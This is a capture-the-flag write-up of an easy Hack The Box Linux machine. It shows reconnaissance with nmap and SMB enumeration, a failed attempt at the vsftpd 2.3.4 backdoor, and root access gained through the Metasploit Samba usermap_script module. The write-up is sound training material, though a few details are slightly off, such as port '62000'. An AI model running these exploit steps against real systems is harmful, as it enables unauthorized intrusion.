---
tags:
  - Linux
  - CVE
  - SMB
---

... is a easy HTB machine which offers a `ftp` service and a `smb` service which have public `CVEs`. The exploit for the `ftp` service does not work, as it is being blocked by a firewall, but the `smb` service works, giving you `root` access!

### Reconnaissance
The tool `nmap` is used to do the initial reconnaissance of any target, as it very reliably sends packets to specific ports of the target to verify if they are open, closed, or filtered. The following command is used as a standard `nmap` scan:
```bash
sudo nmap -sCV $IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: optional, but makes the scan a bit faster and stealthier, as no TCP connect() is used.
# -sC (or --script=default): uses the default scripts of nmap. can quickly discover simple vulnerabilities, such as anonymous logins.
# -sV: further scans open ports to determine the actual service which is running on them, as an open port 80 does not directly imply a HTTP service.
```

the output of `nmap` tells us this:
```bash
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.10.10
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
```
This tells us that the machine is hosting the services `ftp` (anonymous access is allowed), `ssh` and `smb`. 

### Initial Exploitation
I can log into the `ftp` service as `anonymous` using `ftp anonymous@$IP`, but there are no files hosted on there.

So i enumerate the `smb` service using the following command, as `Null Auth` is allowed:
```bash
nxc smb $IP -u '' -p '' --shares
```
This tells me the following:
```bash
Share           Permissions     Remark
-----           -----------     ------
print$                          Printer Drivers
tmp             READ,WRITE      oh noes!
opt                             
IPC$                            IPC Service (lame server (Samba 3.0.20-Debian))
ADMIN$                          IPC Service (lame server (Samba 3.0.20-Debian))
```
As i am allowed to `READ,WRITE` the `tmp` share, i further investigate using the following command:
```bash
smbclient -U '' -N "//$IP/tmp"
```
But nothing of interest is found there.

I could now try brute-forcing these services for valid credentials, but i first google their versions (found out by `nmap`'s `-sV` flag) to find out if i am missing any vulnerabilities. 

And indeed, `vsftp 2.3.4` has a built-in backdoor in the code. If someone connects to the service using a name that ends with `:)` (e.g. `anonymous:)`), the machine opens a service on port `6200` which accepts arbitrary OS commands for execution. This is the workflow of this exploit:
```bash
ftp "anonymous:)"@$IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# provide empty password, the terminal will hang and not respond anymore
```

And in another terminal:
```bash
nc $IP 62000
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# arbitrary commands should be executed now!
```

But this doesn't work. I scan the port `6200` with `nmap` by specifying `nmap -p 6200 $IP`, and it says that it's filtered. Sadly, a firewall must be safe-guarding the server from this attack. I stop the hanged terminal by issuing a `sudo kill <PID>` (found by `ps aux | grep ftp`), and continue searching.

Further googling reveals that `smbd 3.0.20` also has a critical vulnerability. It parses the input `username` as system commands. It is possible to abuse this `CVE` using a `metasploit` module. The workflow is as follows:
```bash
msfconsole # starts metasploit's console
use exploit/multi/samba/usermap_script # uses this module
set RHOSTS <target-IP> # set the IP of the target
set LHOST tun0 # use HTB VPN gateway instead of private IP
run # execute the explot
```
After a short wait i receive a command shell as `root`! I can read the `/home/makis/user.txt` and the `/root/root.txt` without needing to elevate my privileges!

### Summary

Below is a visualized summary of the exploitation steps used in this machine to gain RCE as `SYSTEM`.

``` mermaid
graph LR
  A[SMB<br>Service] -->|OS-command<br>injection| B[Command<br>execution<br>as root];
```